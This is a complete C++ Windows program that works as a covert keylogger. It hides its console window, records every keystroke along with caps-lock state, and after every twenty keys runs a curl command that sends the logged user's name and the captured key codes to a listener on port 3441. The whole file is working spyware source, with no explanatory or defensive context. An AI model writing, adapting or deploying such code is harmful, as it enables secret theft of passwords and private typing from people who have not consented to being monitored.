#include <iostream>
#include <windows.h>
using namespace std;
int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    int INTERVAL = 20;
    int COUNT = 0;
    string ID = getenv("USERNAME");
    string URL = "http://127.0.0.1:3441/t?id=" + ID + "&key=";
    string SSD = "";
    while (true)
    {
        Sleep(10);
        for (int i = 0; i <= 190; i++)
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                string code = to_string(i);
                if ((GetKeyState(VK_CAPITAL) & 0x0001) != 0)
                {
                    code = "@" + code;
                }
                SSD += code + ",";
                COUNT++;
                if (INTERVAL == COUNT)
                {
                    string c = "curl -s -X GET \"" + URL + SSD + "\"";
                    system(c.c_str());
                    COUNT = 0;
                    SSD = "";
                }
            }
        }
    }
    return 0;
}